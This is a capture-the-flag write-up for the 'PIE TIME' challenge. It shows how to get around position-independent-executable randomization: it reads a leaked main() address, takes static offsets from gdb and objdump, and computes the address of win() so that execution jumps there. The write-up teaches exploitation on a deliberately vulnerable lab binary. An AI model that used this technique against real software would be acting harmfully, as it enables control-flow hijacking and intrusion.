# PIE TIME Writeup

**Challenge Name:** PIE TIME

**Points:** 75

**Author:** Darkraicg492

**Description:**

Can you try to get the flag? Beware we have PIE!

## Understanding the Challenge

The challenge involves Position Independent Executables (PIE), meaning addresses of functions are randomized at runtime. Our goal is to hijack execution to call the `win()` function, which prints the flag.

## Analyzing the Binary

We analyse the given binary using `strings`, `objdump`, and `gdb`.

### **Finding Function Offsets**

Using `gdb`:

```
gdb ./vuln
disassemble win
```

This gives us the offset of `win()` in the binary:

```
0x00000000000012a7 <win>
```

### Finding `main()` Address at Runtime

Running the binary with `netcat`:

```
nc rescued-float.picoctf.net 63848
Address of main: 0x5c6a291d133d
Enter the address to jump to, ex => 0x12345:
```

Finding `main` offset:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ objdump -d vuln | grep "<main>"
    11c1:       48 8d 3d 75 01 00 00    lea    0x175(%rip),%rdi        # 133d <main>
000000000000133d <main>:
    1387:       48 8d 35 af ff ff ff    lea    -0x51(%rip),%rsi        # 133d <main>
```

### Calculating `win()` Address

Since PIE is enabled, function addresses are determined at runtime. We calculate `win()` actual address using:

```
win_addr = (main_addr - main_offset) + win_offset
```

where:

- `main_addr = 0x5c6a291d133d` (runtime address of main)
- `main_offset = 0x133d` (static offset of main from `objdump`)
- `win_offset = 0x12a7` (static offset of win from `gdb`)

Calculating:

```
win_addr = (0x5c6a291d133d - 0x133d) + 0x12a7
         = 0x5c6a291d0000 + 0x12a7
         = 0x5c6a291d12a7
```

## Exploiting the Binary

We input the computed address into the program:

```
Enter the address to jump to, ex => 0x12345: 0x5c6a291d12a7
```
![image](https://github.com/user-attachments/assets/d5ecca14-1773-4815-be82-7b6271b6ee3a)

